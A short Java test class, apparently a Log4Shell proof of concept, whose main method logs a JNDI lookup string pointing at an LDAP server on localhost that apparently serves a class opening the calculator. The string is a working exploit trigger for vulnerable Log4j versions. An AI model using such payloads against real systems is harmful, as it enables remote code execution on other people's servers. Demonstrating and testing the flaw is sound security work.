package com.its.ldap.server.manager;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jShowMessageTest {
	private static final Logger log = LogManager.getLogger(Log4jShowMessageTest.class);

	public static void main(String[] args) {
		log.error("${jndi:ldap://localhost:8888/OpenCalc}");
	}
}
